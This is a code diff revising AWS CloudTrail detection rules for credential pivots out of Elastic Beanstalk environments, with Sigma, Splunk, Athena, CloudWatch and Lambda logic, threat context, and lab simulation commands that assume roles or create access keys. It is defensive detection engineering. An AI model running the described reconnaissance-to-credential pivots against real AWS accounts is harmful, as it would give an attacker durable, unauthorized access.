+      threatContext: {
+        attackerBehavior: "An attacker who gains access to a Beanstalk-linked principal may create long-lived credentials or assume additional roles to move beyond the original environment's privileges.",
+        realWorldUsage: "This is attractive because application environments often hold credentials or trust paths that can be turned into more durable or expansive access.",
+        whyItMatters: "The key signal is that the pivot originated from a Beanstalk-linked identity or execution path, not whether the principal name contains Beanstalk-like strings.",
+        riskAndImpact: "If missed, defenders may overlook the moment a compromise moves from environment-level access into durable IAM or STS pivots.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for IAM and STS", "Elastic Beanstalk environment-to-role linkage inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.userName", "requestParameters.roleArn", "sourceIPAddress"],
+        loggingRequirements: ["CreateAccessKey and AssumeRole events must be ingested.", "The environment should resolve whether the acting principal is linked to a Beanstalk environment or instance profile path.", "Beanstalk recon events should be available for downstream correlation."],
+        limitations: ["CloudTrail alone does not prove the principal is Beanstalk-linked without enrichment.", "Some legitimate CI/CD or platform workflows may use Beanstalk-linked roles for expected pivots.", "The baseline event does not alone prove malicious intent."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Principal performing the credential pivot" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.userName", normalizedPath: "iam.target.user.name", notes: "IAM user receiving an access key where applicable" },
+          { rawPath: "requestParameters.roleArn", normalizedPath: "aws.sts.assume_role.target_arn", notes: "Role target for AssumeRole pivots" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "CreateAccessKey", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session", type: "AssumedRole" },
+          iam: { target: { user: { name: "backdoor" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Beanstalk Principal Linkage", description: "Resolve whether the acting principal is actually tied to a Beanstalk environment, instance profile, or deployment path.", examples: ["environment instance profile", "Beanstalk service role"], falsePositiveReduction: "Replaces brittle ARN substring matching." },
+        { dimension: "Pivot Legitimacy", description: "Determine whether the principal is expected to create IAM credentials or assume the target role.", examples: ["approved deployment role chain", "unexpected app-role pivot"], falsePositiveReduction: "Separates expected automation from suspicious credential use." },
+        { dimension: "Environment Sensitivity", description: "Classify the Beanstalk environment by business criticality and privilege impact.", examples: ["prod application environment", "test environment"], falsePositiveReduction: "Improves prioritization when privileged pivots originate from important environments." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a baseline pivot rule for CreateAccessKey or AssumeRole activity that originates from a principal linked to Elastic Beanstalk. The detector should first establish Beanstalk linkage through environment or role metadata, then surface the credential pivot for triage.",
+        conditions: ["eventSource equals iam.amazonaws.com and eventName equals CreateAccessKey, or eventSource equals sts.amazonaws.com and eventName equals AssumeRole", "acting principal is linked to an Elastic Beanstalk environment or execution path"],
+        tuningGuidance: "1. Resolve Beanstalk linkage explicitly. 2. Separate expected CI/CD or platform pivots from suspicious ones. 3. Correlate with prior environment reconnaissance or later privilege-affecting actions for stronger confidence.",
+        whenToFire: "Fire when a Beanstalk-linked principal performs CreateAccessKey or AssumeRole.",
+      },
+      simulationCommand: "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/TargetRole --role-session-name test",
+      quality: {
+        signalQuality: 7,
+        falsePositiveRate: "Low-Medium with Beanstalk linkage and workflow context; medium-high with raw name heuristics",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with Beanstalk linkage inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because credential pivots can immediately expand attacker access.",
+        considerations: ["This is the baseline Beanstalk credential-pivot detector.", "Beanstalk linkage enrichment is the main dependency."],
+      },
+    },
   },
   {
     id: "det-119",
     title: "Beanstalk Recon Followed by Credential Pivot",
-    description: "High-confidence credential-pivot: DescribeConfigurationSettings then within short window same actor performs CreateAccessKey, AssumeRole, AttachUserPolicy, PutUserPolicy, or AttachRolePolicy. Models the full path: read env config, extract credentials, pivot.",
+    description: "High-confidence Beanstalk recon-to-pivot detection. This should correlate configuration reads with later credential or privilege pivots using ordered sequence and stable actor identity, not simple same-user aggregation.",
     awsService: "Elastic Beanstalk",
     relatedServices: ["IAM", "STS"],
     severity: "Critical",
@@ -13559,9 +15595,9 @@ detection:
       - AttachUserPolicy
       - PutUserPolicy
       - AttachRolePolicy
-  condition: 1 of selection_*
+  condition: selection_beanstalk
 level: critical
-# Full correlation (actor, 30 min) requires SIEM.`,
+# Full correlation requires ordered sequence and stable actor identity across Beanstalk recon and the later pivot.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=elasticbeanstalk.amazonaws.com AND eventName=DescribeConfigurationSettings) OR (eventName=CreateAccessKey OR eventName=AssumeRole OR eventName=AttachUserPolicy OR eventName=PutUserPolicy OR eventName=AttachRolePolicy))
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -13594,16 +15630,96 @@ ORDER BY r.recon_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
+      lambda: `"""
+Beanstalk Recon Followed by Credential Pivot
+Trigger: EventBridge rule matching DescribeConfigurationSettings.
+Use for: Correlation from Beanstalk environment reconnaissance to later IAM or STS pivot activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "elasticbeanstalk.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "DescribeConfigurationSettings":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-beanstalk-recon-plus-pivot-correlation",
+        "alert": {
+            "rule_id": "det-119",
+            "title": "Beanstalk Recon Followed by Credential Pivot",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "application_name": detail.get("requestParameters", {}).get("applicationName"),
+            "environment_name": detail.get("requestParameters", {}).get("environmentName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { applicationName: "my-app", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify DescribeConfigurationSettings and pivot sequence.", "Verify if pivot was authorized.", "Check for credential exfiltration from env config."],
-    testingSteps: ["Call DescribeConfigurationSettings, then CreateAccessKey within 30 min.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the `DescribeConfigurationSettings` event and the later IAM or STS pivot actions within the correlation window.", "Verify whether the same normalized actor performed the read and the later credential or privilege changes.", "Assess whether the configuration read may have exposed credentials, secret references, or trust paths used in the later pivot."],
+    testingSteps: ["Call `DescribeConfigurationSettings` in a lab environment, then perform `AssumeRole`, `CreateAccessKey`, or a policy-attachment action within 30 minutes.", "Verify both the reconnaissance and pivot events appear in CloudTrail.", "Run the detector and confirm it requires ordered recon-to-pivot correlation rather than loose event grouping."],
+    lifecycle: {
+      whyItMatters: "This is the clearest Beanstalk credential-theft chain in the family: environment configuration is inspected and then the same operator quickly pivots into IAM or STS activity.",
+      threatContext: {
+        attackerBehavior: "An attacker may read Beanstalk configuration settings to discover credentials, secret references, or privileged roles, then pivot into IAM or STS actions.",
+        realWorldUsage: "This is practical because configuration reads can reveal the material needed to move from app-environment access into broader cloud control.",
+        whyItMatters: "The strongest signal is the ordered shift from reconnaissance into credential or privilege pivot, not either side alone.",
+        riskAndImpact: "If missed, defenders may not connect a seemingly harmless Beanstalk read with the pivot that followed it.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Elastic Beanstalk", "AWS CloudTrail management events for IAM and STS"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.applicationName", "requestParameters.environmentName", "sourceIPAddress"],
+        loggingRequirements: ["DescribeConfigurationSettings and later IAM/STS events must be ingested into the same analytics environment.", "Actor identity should be normalized across IAM users and assumed roles.", "The detection engine must support ordered short-window correlation."],
+        limitations: ["Some legitimate admins may read configuration settings before performing expected changes.", "Actor-only joins can still be noisy in heavily shared admin contexts.", "The model is strongest when paired with environment and workflow context."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor reading Beanstalk configuration and later pivoting" },
+          { rawPath: "requestParameters.applicationName", normalizedPath: "aws.elasticbeanstalk.application.name", notes: "Application being inspected" },
+          { rawPath: "requestParameters.environmentName", normalizedPath: "aws.elasticbeanstalk.environment.name", notes: "Environment being inspected" },
+          { rawPath: "follow_on.eventName", normalizedPath: "related.event.action", notes: "Credential or privilege pivot after Beanstalk recon" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "DescribeConfigurationSettings", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { elasticbeanstalk: { application: { name: "my-app" }, environment: { name: "prod" } } },
+          related: { event: { action: "AssumeRole" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Stable Actor Identity", description: "Normalize actor identity across direct and assumed-role sessions so the recon actor can be matched to later pivot behavior.", examples: ["IAM user", "assumed app role"], falsePositiveReduction: "Improves recon-to-pivot correlation fidelity." },
+        { dimension: "Environment Sensitivity", description: "Classify the Beanstalk environment by privilege exposure and business criticality.", examples: ["prod application", "internal admin environment"], falsePositiveReduction: "Raises urgency when sensitive environments are being mined for pivots." },
+        { dimension: "Pivot Type", description: "Classify the later action as key creation, role assumption, or IAM permission mutation.", examples: ["CreateAccessKey", "AttachRolePolicy"], falsePositiveReduction: "Makes the credential-theft path easier to triage." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a Beanstalk recon-to-pivot chain: an actor reads configuration settings and then performs credential or privilege pivot actions soon afterward. It should require event order and stable actor identity.",
+        conditions: ["first eventSource equals elasticbeanstalk.amazonaws.com and eventName equals DescribeConfigurationSettings", "second event is CreateAccessKey, AssumeRole, AttachUserPolicy, PutUserPolicy, or AttachRolePolicy by the same normalized actor identity", "follow-on action occurs within 30 minutes"],
+        tuningGuidance: "1. Require order. 2. Normalize actor identity across sessions. 3. Escalate further when the environment is sensitive or the pivot is unusually powerful for the actor.",
+        whenToFire: "Fire when Beanstalk reconnaissance is followed quickly by a credential or privilege pivot from the same operator identity.",
+      },
+      simulationCommand: "aws elasticbeanstalk describe-configuration-settings --application-name my-app --environment-name prod",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with ordered correlation and environment context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because the recon-to-pivot window is short and actionable.",
+        considerations: ["This is the highest-fidelity Beanstalk credential-pivot detector in the batch.", "Ordered correlation and stable actor identity are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-120",
-    title: "CreateAccessKey for Suspicious Target After Beanstalk Access",
-    description: "Detects likely persistence after Beanstalk credential theft: DescribeConfigurationSettings or other Beanstalk recon then CreateAccessKey for a suspicious or high-value user.",
+    title: "Beanstalk Recon Followed by CreateAccessKey for High-Risk Target",
+    description: "Detects likely persistence after Beanstalk-derived credential access when environment reconnaissance is followed by `CreateAccessKey` for a high-risk target identity. This should depend on target-user classification, not suspicious username substrings.",
     awsService: "IAM",
     relatedServices: ["Elastic Beanstalk"],
     severity: "Critical",
@@ -13622,14 +15738,9 @@ detection:
   selection_createkey:
     eventSource: iam.amazonaws.com
     eventName: CreateAccessKey
-  filter_suspicious:
-    requestParameters.userName|contains:
-      - 'backdoor'
-      - 'admin'
-      - 'breakglass'
-  condition: (selection_beanstalk or selection_createkey) and filter_suspicious
+  condition: selection_beanstalk or selection_createkey
 level: critical
-# Full correlation (actor, 30 min) requires SIEM.`,
+# Full correlation requires ordered sequence plus target-user risk classification.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=elasticbeanstalk.amazonaws.com AND eventName=DescribeConfigurationSettings) OR (eventSource=iam.amazonaws.com AND eventName=CreateAccessKey))
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -13649,7 +15760,6 @@ createkey_evt AS (
   FROM cloudtrail_logs
   WHERE eventSource = 'iam.amazonaws.com'
     AND eventName = 'CreateAccessKey'
-    AND (requestParameters.userName LIKE '%backdoor%' OR requestParameters.userName LIKE '%admin%' OR requestParameters.userName LIKE '%breakglass%')
 )
 SELECT b.actor, b.recon_time, c.key_time, c.userName
 FROM beanstalk_evt b
@@ -13659,21 +15769,99 @@ JOIN createkey_evt c ON b.actor = c.actor
 ORDER BY b.recon_time DESC`,
       cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.userName
 | filter (eventSource = "elasticbeanstalk.amazonaws.com" and eventName = "DescribeConfigurationSettings")
-  or (eventSource = "iam.amazonaws.com" and eventName = "CreateAccessKey" and (requestParameters.userName like /backdoor|admin|breakglass/))
+  or (eventSource = "iam.amazonaws.com" and eventName = "CreateAccessKey")
 | stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["iam.amazonaws.com"], eventName: ["CreateAccessKey"] } }, null, 2),
+      lambda: `"""
+Beanstalk Recon Followed by CreateAccessKey for High-Risk Target
+Trigger: EventBridge rule matching CreateAccessKey.
+Use for: Correlation from Beanstalk recon into creation of access keys for high-risk identities.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "iam.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "CreateAccessKey":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-beanstalk-recon-plus-high-risk-createaccesskey-correlation",
+        "alert": {
+            "rule_id": "det-120",
+            "title": "Beanstalk Recon Followed by CreateAccessKey for High-Risk Target",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "target_user": detail.get("requestParameters", {}).get("userName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.userName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateAccessKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session" }, requestParameters: { userName: "backdoor" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify Beanstalk recon and CreateAccessKey sequence.", "Verify if target user was authorized.", "Check for stolen credentials from env."],
-    testingSteps: ["DescribeConfigurationSettings, then CreateAccessKey for backdoor user.", "Run correlation query."],
+    investigationSteps: ["Identify the Beanstalk reconnaissance event and the later `CreateAccessKey` call, including the target user receiving credentials.", "Determine whether the target identity is privileged, dormant, break-glass, or otherwise high-risk for new access keys.", "Assess whether the same actor likely extracted credentials or trust paths from the Beanstalk environment before creating the key."],
+    testingSteps: ["Read Beanstalk configuration settings in a test environment, then call `CreateAccessKey` for a target user that is classified as high-risk in your identity model.", "Verify both events appear in CloudTrail.", "Run the detector and confirm it keys on target-user risk classification rather than username substrings like `admin` or `backdoor`."],
+    lifecycle: {
+      whyItMatters: "Creating a new access key for a high-risk identity after Beanstalk reconnaissance is a strong persistence and credential-theft signal. It suggests environment-derived access was turned into durable IAM credentials.",
+      threatContext: {
+        attackerBehavior: "An attacker may inspect Beanstalk configuration to discover credentials or trust paths and then create access keys for a privileged, dormant, or otherwise high-risk IAM user.",
+        realWorldUsage: "This is attractive because it converts environment access into durable IAM persistence without immediately changing visible app infrastructure.",
+        whyItMatters: "The target identity's risk matters more than whether its name contains obvious suspicious words.",
+        riskAndImpact: "If missed, defenders may fail to notice the exact point where Beanstalk-derived access became durable IAM credentials on a valuable target identity.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Elastic Beanstalk", "AWS CloudTrail management events for IAM", "Identity risk classification inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.userName", "requestParameters.applicationName", "requestParameters.environmentName", "sourceIPAddress"],
+        loggingRequirements: ["DescribeConfigurationSettings and CreateAccessKey events must be ingested into the same analytics environment.", "The platform should classify IAM users by privilege, dormancy, and break-glass or service-account posture.", "The engine must support ordered short-window correlation."],
+        limitations: ["Username text alone is not reliable for target classification.", "Some legitimate admins may read Beanstalk configuration and later create keys during approved operations.", "The model depends on good target-user enrichment."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.userName", normalizedPath: "iam.target.user.name", notes: "IAM user receiving the new access key" },
+          { rawPath: "enrichment.targetUserRisk", normalizedPath: "iam.target.user.risk_class", notes: "Resolved target-user risk classification" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor performing the Beanstalk recon and later key creation" },
+          { rawPath: "requestParameters.environmentName", normalizedPath: "aws.elasticbeanstalk.environment.name", notes: "Beanstalk environment inspected earlier in the chain" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["creation"], action: "CreateAccessKey", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session", type: "AssumedRole" },
+          iam: { target: { user: { name: "backdoor", risk_class: "privileged_or_unexpected_key_target" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Target User Risk", description: "Classify whether the target user is privileged, dormant, break-glass, console-ineligible, or otherwise high-risk for new keys.", examples: ["break-glass user", "privileged dormant IAM user"], falsePositiveReduction: "Replaces brittle suspicious-username matching." },
+        { dimension: "Stable Actor Identity", description: "Normalize the actor across the Beanstalk recon and later key-creation stages.", examples: ["same assumed role session", "same IAM user"], falsePositiveReduction: "Improves correlation fidelity." },
+        { dimension: "Environment-to-Identity Linkage", description: "Assess whether the Beanstalk environment plausibly exposed credentials or trust paths relevant to the target IAM user.", examples: ["env contained IAM admin secret reference", "no plausible path"], falsePositiveReduction: "Raises confidence when the environment context explains the pivot." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a persistence-focused Beanstalk pivot: an actor reads environment configuration and then creates an access key for a high-risk IAM user. It should require event order and target-user risk classification, not simple username matching.",
+        conditions: ["first eventSource equals elasticbeanstalk.amazonaws.com and eventName equals DescribeConfigurationSettings", "second eventSource equals iam.amazonaws.com and eventName equals CreateAccessKey", "target IAM user is classified as high-risk", "follow-on action occurs within 30 minutes"],
+        tuningGuidance: "1. Classify target users through identity metadata, not names. 2. Require event order. 3. Escalate strongly when the target user is privileged, dormant, or outside expected key-creation workflows.",
+        whenToFire: "Fire when Beanstalk reconnaissance is followed quickly by CreateAccessKey for a high-risk target user.",
+      },
+      simulationCommand: "aws elasticbeanstalk describe-configuration-settings --application-name my-app --environment-name prod && aws iam create-access-key --user-name demo-user",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with target-user classification and ordered correlation",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with identity-risk joins", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because credential persistence becomes actionable immediately.",
+        considerations: ["This is the target-centric Beanstalk persistence detector.", "Target-user risk classification is the main dependency."],
+      },
+    },
   },
   {
     id: "det-121",
-    title: "Unexpected Actor Uses Beanstalk-Derived Privileges",
-    description: "Detects post-Beanstalk pivot by identities that normally should not interact with IAM/STS this way. Suspicious: application role or Beanstalk instance role performing CreateAccessKey, AssumeRole, or privileged follow-on actions.",
+    title: "Beanstalk-Derived Privileges Used Outside Approved Access Path",
+    description: "Detects IAM or STS pivots from Beanstalk-linked principals when the acting identity is outside approved privilege-use workflows. This should rely on exact actor authorization and Beanstalk linkage, not ARN substring matching.",
     awsService: "IAM",
     relatedServices: ["Elastic Beanstalk", "STS"],
     severity: "High",
@@ -13693,43 +15881,111 @@ detection:
     eventName:
       - CreateAccessKey
       - AssumeRole
-  filter_beanstalk:
-    userIdentity.arn|contains:
-      - 'elasticbeanstalk'
-      - 'aws-elasticbeanstalk'
-  filter_known:
-    userIdentity.arn|contains:
-      - '/role/Admin'
-      - '/role/Platform'
-  condition: selection and filter_beanstalk and not filter_known
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail ((eventSource=iam.amazonaws.com AND eventName=CreateAccessKey) OR (eventSource=sts.amazonaws.com AND eventName=AssumeRole))
-| where (like(userIdentity.arn, "%elasticbeanstalk%") OR like(userIdentity.arn, "%aws-elasticbeanstalk%")) AND NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%"))
 | table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn, sourceIPAddress`,
       cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn, sourceIPAddress
 FROM cloudtrail_logs
 WHERE ((eventSource = 'iam.amazonaws.com' AND eventName = 'CreateAccessKey') OR (eventSource = 'sts.amazonaws.com' AND eventName = 'AssumeRole'))
-  AND (userIdentity.arn LIKE '%elasticbeanstalk%' OR userIdentity.arn LIKE '%aws-elasticbeanstalk%')
-  AND userIdentity.arn NOT LIKE '%/role/Admin%'
-  AND userIdentity.arn NOT LIKE '%/role/Platform%'
 ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn
 | filter (eventSource = "iam.amazonaws.com" and eventName = "CreateAccessKey") or (eventSource = "sts.amazonaws.com" and eventName = "AssumeRole")
-| filter (userIdentity.arn like /elasticbeanstalk|aws-elasticbeanstalk/) and userIdentity.arn not like /\\/role\\/(Admin|Platform)/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.iam", "aws.sts"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateAccessKey", "AssumeRole"] } }, null, 2),
+      lambda: `"""
+Beanstalk-Derived Privileges Used Outside Approved Access Path
+Trigger: EventBridge rule matching CreateAccessKey or AssumeRole.
+Use for: Authorization checks on Beanstalk-linked IAM or STS pivots.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    event_source = detail.get("eventSource")
+    event_name = detail.get("eventName")
+    if (event_source, event_name) not in {
+        ("iam.amazonaws.com", "CreateAccessKey"),
+        ("sts.amazonaws.com", "AssumeRole"),
+    }:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-authorized-beanstalk-pivot-actor-check",
+        "alert": {
+            "rule_id": "det-121",
+            "title": "Beanstalk-Derived Privileges Used Outside Approved Access Path",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_name": event_name,
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.userName", "requestParameters.roleArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateAccessKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session" }, requestParameters: { userName: "backdoor" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the Beanstalk-linked actor.", "Verify if IAM/STS use was expected.", "Update allowlist if legitimate."],
-    testingSteps: ["As Beanstalk instance role (non-admin), call CreateAccessKey.", "Verify detection triggers."],
+    investigationSteps: ["Identify the actor, session issuer, and Beanstalk linkage behind the credential pivot.", "Verify whether this principal is explicitly approved to create access keys or assume roles from a Beanstalk-derived context.", "Determine whether the action came from a trusted deployment workflow or an unexpected application or environment role."],
+    testingSteps: ["From a lab principal linked to an Elastic Beanstalk environment but outside the approved pivot set, perform `AssumeRole` or `CreateAccessKey`.", "Verify CloudTrail records the actor and pivot target context.", "Run the detector and confirm it relies on explicit authorization and Beanstalk linkage rather than ARN substrings."],
+    lifecycle: {
+      whyItMatters: "Beanstalk-derived privileges should only be used in narrow, well-understood workflows. When an unapproved Beanstalk-linked principal pivots into IAM or STS, it is a strong sign of credential abuse or post-compromise expansion.",
+      threatContext: {
+        attackerBehavior: "An attacker may use credentials or trust paths exposed through an Elastic Beanstalk environment to assume roles or create durable IAM credentials.",
+        realWorldUsage: "This is attractive because it turns application-environment access into broader and longer-lived cloud control.",
+        whyItMatters: "Authorization context is more important than whether a role name contains Beanstalk-like text.",
+        riskAndImpact: "If missed, defenders may not recognize that a compromised application environment is being used to extend access into IAM or STS.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for IAM and STS", "Elastic Beanstalk environment-to-role linkage inventory", "Authorized privilege-use inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.userName", "requestParameters.roleArn", "sourceIPAddress"],
+        loggingRequirements: ["CreateAccessKey and AssumeRole events must be ingested with full actor context.", "The environment should know which principals are linked to Beanstalk environments.", "Approved privilege-use workflows should be modeled explicitly."],
+        limitations: ["Without Beanstalk linkage and actor inventories, the rule becomes a weak anomaly detector.", "Some legitimate deployment paths may require role assumption from Beanstalk-linked principals.", "The pivot event alone does not prove how the actor obtained the initial access."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Principal performing the pivot" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.userName", normalizedPath: "iam.target.user.name", notes: "Target IAM user for CreateAccessKey where applicable" },
+          { rawPath: "requestParameters.roleArn", normalizedPath: "aws.sts.assume_role.target_arn", notes: "Target role for AssumeRole pivots" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "AssumeRole", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session", type: "AssumedRole" },
+          aws: { sts: { assume_role: { target_arn: "arn:aws:iam::123456789012:role/TargetRole" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Beanstalk Linkage", description: "Resolve whether the principal is tied to a Beanstalk environment, instance profile, or deployment path.", examples: ["environment instance profile", "Beanstalk service role"], falsePositiveReduction: "Prevents unrelated IAM or STS usage from being misclassified." },
+        { dimension: "Authorized Pivot Scope", description: "Determine which roles or identities the principal is expected to assume or modify.", examples: ["deployment role only", "no IAM key creation allowed"], falsePositiveReduction: "Separates approved automation from suspicious privilege use." },
+        { dimension: "Environment Criticality", description: "Classify the originating Beanstalk environment by business importance and privilege exposure.", examples: ["prod app env", "test env"], falsePositiveReduction: "Improves prioritization of suspicious pivots." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect IAM or STS pivots from Beanstalk-linked principals when those pivots fall outside approved privilege-use paths. It should match CreateAccessKey or AssumeRole and then use Beanstalk linkage plus actor authorization context to decide risk.",
+        conditions: ["eventSource equals iam.amazonaws.com and eventName equals CreateAccessKey, or eventSource equals sts.amazonaws.com and eventName equals AssumeRole", "acting principal is linked to a Beanstalk environment", "actor is not approved for the observed pivot or the pivot target is outside approved scope"],
